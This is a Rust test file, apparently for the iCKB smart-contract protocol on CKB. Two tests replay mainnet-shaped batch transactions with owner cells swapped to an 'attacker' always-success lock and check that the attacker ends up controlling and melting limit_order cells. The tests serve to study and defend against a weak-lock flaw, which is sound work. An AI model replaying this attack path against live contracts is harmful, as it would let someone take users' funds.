use super::*;

// Replays the live five-claim batch into its later limit_order consumer, but swaps the fresh owner and master to attacker locks, so the recreated order should stay attacker-controlled and melt cleanly.
#[test]
fn weak_lock_derived_five_claim_live_batch_can_flow_into_later_attacker_owned_limit_order_state() {
    let mut context = Context::default();
    let attacker_lock = named_always_success_lock(&mut context, b"attacker");
    let (_ickb_logic, limit_order, owned_owner, dao, xudt) =
        ickb_logic_limit_order_owned_owner_dao_and_xudt_scripts(&mut context);

    let withdraw_header = rpc_header(
        "0x113a006",
        "0x7080295002c78",
        "0x6c0553271bda2153d797ad6b744e2900a8d5c3b324467b08004f90967fde0909",
    );
    let deposit_headers = [
        rpc_header(
            "0xe24036",
            "0x70804f5002572",
            "0x50f82c742d7f354f8f1118fad4882800f9b3b92c91951e0700383324136bf308",
        ),
        rpc_header(
            "0xe23fa0",
            "0x708045f002572",
            "0x54eef1334273354f1632bf98d2882800d0fcbeff70911e0700a58706256af308",
        ),
        rpc_header(
            "0xe23e80",
            "0x708033f002572",
            "0x142d1acd5f5c354f7344cc06ce88280028cf552485891e07007a1bc16268f308",
        ),
        rpc_header(
            "0xe23ac3",
            "0x708068a002571",
            "0x25e907d25410354fcbeb21d7be882800ac3b9cbe326f1e0700872d8ca662f308",
        ),
        rpc_header(
            "0xe2369a",
            "0x7080261002571",
            "0x4ebd64f0b4bb344f635fb1f0ad88280036a6c0eee7511e0700c04cd56075f308",
        ),
    ];

    let batch_tx = "0x8eb6c29fb8be1dfe36a6a3ecb6a131b178df6d57fa93866b78acb06664f6e282";
    let owned = |index, capacity, data, since| In {
        header: Some(withdraw_header.clone()),
        since: u64_from_hex(since),
        ..at(batch_tx, index, live(capacity, &owned_owner, Some(&dao), data))
    };
    let owner = |index| at(batch_tx, index, live("0x2540be400", &attacker_lock, Some(&owned_owner), "0xfbffffff"));
    let later = TxSpec {
        inputs: vec![
            owned(4, "0xa6260cdd291", "0x3640e20000000000", "0x20070804f5002c7a"),
            owned(3, "0xa626031d463", "0xa03fe20000000000", "0x200708045f002c7a"),
            owned(2, "0xa625f06529d", "0x803ee20000000000", "0x200708033f002c7a"),
            owned(1, "0xa625b231491", "0xc33ae20000000000", "0x200708068a002c79"),
            owned(0, "0xa6256cf8302", "0x9a36e20000000000", "0x2007080261002c79"),
            owner(9),
            owner(8),
            owner(7),
            owner(6),
            owner(5),
        ],
        outputs: vec![
            live("0x23c346000", &attacker_lock, Some(&limit_order), "0x").into(),
            live(
                "0x1bea98cf00",
                &limit_order,
                Some(&xudt),
                "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff0000c16ff2862300bcedcc32756529000000000000000000000000000000000021",
            )
            .into(),
            live("0x34d6567f32d3", &attacker_lock, None, "0x").into(),
        ],
        header_deps: [vec![withdraw_header.clone()], deposit_headers.to_vec()].concat(),
    };

    let later_tx = replay(
        &mut context,
        &later,
        vec![
            bytes_from_hex("0x1c00000010000000100000001c000000080000000100000000000000"),
            bytes_from_hex("0x1c00000010000000100000001c000000080000000200000000000000"),
            bytes_from_hex("0x1c00000010000000100000001c000000080000000300000000000000"),
            bytes_from_hex("0x1c00000010000000100000001c000000080000000400000000000000"),
            bytes_from_hex("0x1c00000010000000100000001c000000080000000500000000000000"),
            Bytes::new(),
        ],
    );
    context
        .verify(&later_tx, MAX_CYCLES)
        .expect("weak-lock five-claim batch should reach the attacker-owned limit_order state");

    let later_hash = later_tx.hash();
    let melt = TxSpec {
        inputs: vec![
            In { out_point: OutPoint::new(later_hash.clone(), 1), ..In::new(later.outputs[1].cell.clone()) },
            In { out_point: OutPoint::new(later_hash, 0), ..In::new(later.outputs[0].cell.clone()) },
        ],
        outputs: vec![
            Cell { capacity: u64_from_hex("0x1bea98cf00") + u64_from_hex("0x23c346000"), lock: attacker_lock, type_: None, data: vec![] }.into(),
        ],
        ..Default::default()
    };

    let melt_tx = replay(&mut context, &melt, vec![]);
    context
        .verify(&melt_tx, MAX_CYCLES)
        .expect("attacker should melt the resulting attacker-owned limit_order state");
}

// Replays the live eight-claim batch into the historical later consumer, but keeps the fresh owner, master, and change attacker-owned, so the recreated order should also remain attacker-controlled and meltable.
#[test]
fn weak_lock_derived_eight_claim_batch_can_flow_into_later_attacker_owned_limit_order_state() {
    let mut context = Context::default();
    let attacker_lock = named_always_success_lock(&mut context, b"attacker");
    let (ickb_logic, limit_order, owned_owner, dao, xudt) =
        ickb_logic_limit_order_owned_owner_dao_and_xudt_scripts(&mut context);

    let withdraw_header = rpc_header(
        "0x103a436",
        "0x511038b00311b",
        "0xe8527c922537b9559c17b476e1cd290056cedd92ed7d9508008a16eefae93407",
    );
    let deposit_headers = [
        rpc_header(
            "0xfba66c",
            "0x4ad01f0002fbc",
            "0x9fbfc52bcaf3f45450fb87916da82900d8bd5641b1ee50080002ec946c4a3707",
        ),
        rpc_header(
            "0xfba6dc",
            "0x4ad0260002fbc",
            "0x94870c232c01f5541584192170a829004a9ffda878f3500800956f476c4a3707",
        ),
        rpc_header(
            "0xf7ae28",
            "0x57701af002f09",
            "0xc26333efaae29054fae5e5c24095290025db0c4102762f0800c93eb650f43607",
        ),
        rpc_header(
            "0xf7ae5a",
            "0x57701e1002f09",
            "0x0ca04d8cc7e790549aa202be419529009edf535dd5772f080061c8c69bf43607",
        ),
    ];

    let batch_tx = "0xaa5670d939c85198afc38595e0334e859c80716fa64b37aecd7fc8b7511056e4";
    let owned = |index, capacity, data, since| In {
        header: Some(withdraw_header.clone()),
        since: u64_from_hex(since),
        ..at(batch_tx, index, live(capacity, &owned_owner, Some(&dao), data))
    };
    let owner = |index| at(batch_tx, index, live("0x2540be400", &attacker_lock, Some(&owned_owner), "0xf8ffffff"));
    let deposit = || live("0xab5f2c8d6b0", &ickb_logic, Some(&dao), "0x0000000000000000").into();
    let later = TxSpec {
        inputs: vec![
            at(
                batch_tx,
                17,
                live(
                    "0x4a221e700",
                    &limit_order,
                    Some(&xudt),
                    "0xd45e0323c20200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff000000000000000000000000000000000000c16ff2862300fe12a4eaa0ca290021",
                ),
            ),
            at(batch_tx, 16, live("0x23c346000", &attacker_lock, Some(&limit_order), "0x")),
            at(batch_tx, 18, live("0x142514df48", &attacker_lock, None, "0x")),
            owned(6, "0xaa71849baec", "0x5aaef70000000000", "0x20057701e1003125"),
            owned(5, "0xaa71806dfc1", "0x28aef70000000000", "0x20057701af003125"),
            owned(4, "0xaa71806dfc1", "0x28aef70000000000", "0x20057701af003125"),
            owned(3, "0xaa71806dfc1", "0x28aef70000000000", "0x20057701af003125"),
            owned(2, "0xaa71806dfc1", "0x28aef70000000000", "0x20057701af003125"),
            owned(1, "0xaac0158018d", "0xdca6fb0000000000", "0x2004ad0260003124"),
            owned(0, "0xaac00b02e36", "0x6ca6fb0000000000", "0x2004ad01f0003124"),
            owner(14),
            owner(13),
            owner(12),
            owner(11),
            owner(10),
            owner(9),
            owner(8),
        ],
        outputs: vec![
            deposit(),
            deposit(),
            deposit(),
            deposit(),
            deposit(),
            deposit(),
            live("0x283baec00", &attacker_lock, Some(&ickb_logic), "0x06000000b0c4060ab40a0000").into(),
            live("0x23c346000", &attacker_lock, Some(&limit_order), "0x").into(),
            live(
                "0xa4a505d73a0",
                &limit_order,
                Some(&xudt),
                "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff0000c16ff286230032784f5372e129000000000000000000000000000000000021",
            )
            .into(),
            live("0x372261400", &attacker_lock, Some(&xudt), "0xd45e0323c20200000000000000000000").into(),
            live("0x8c3ee380ed", &attacker_lock, None, "0x").into(),
        ],
        header_deps: vec![
            withdraw_header.clone(),
            deposit_headers[3].clone(),
            deposit_headers[2].clone(),
            deposit_headers[1].clone(),
            deposit_headers[0].clone(),
        ],
    };

    let witness_2 = header_dep_index_witness(2);
    let later_tx = replay(
        &mut context,
        &later,
        vec![
            bytes_from_hex("0x10000000100000001000000010000000"),
            bytes_from_hex(
                "0x69000000100000006900000069000000550000005500000010000000550000005500000041000000fe20813789f911946343d69c6fb13cd56c4b87b333d824a699546f500103d21d21c9a11c7775756aaf6532b24dfbea44b05ed28d8f649fd0a79260c6c77a676c00",
            ),
            bytes_from_hex("0x10000000100000001000000010000000"),
            header_dep_index_witness(1),
            witness_2.clone(),
            witness_2.clone(),
            witness_2.clone(),
            witness_2,
            header_dep_index_witness(3),
            header_dep_index_witness(4),
        ],
    );
    context
        .verify(&later_tx, MAX_CYCLES)
        .expect("weak-lock mainnet batch should reach the attacker-owned limit_order state");

    let later_hash = later_tx.hash();
    let melt = TxSpec {
        inputs: vec![
            In { out_point: OutPoint::new(later_hash.clone(), 8), ..In::new(later.outputs[8].cell.clone()) },
            In { out_point: OutPoint::new(later_hash, 7), ..In::new(later.outputs[7].cell.clone()) },
        ],
        outputs: vec![
            Cell { capacity: u64_from_hex("0xa4a505d73a0") + u64_from_hex("0x23c346000"), lock: attacker_lock, type_: None, data: vec![] }.into(),
        ],
        ..Default::default()
    };

    let melt_tx = replay(&mut context, &melt, vec![]);
    context
        .verify(&melt_tx, MAX_CYCLES)
        .expect("attacker should melt the resulting mainnet-shaped limit_order state");
}
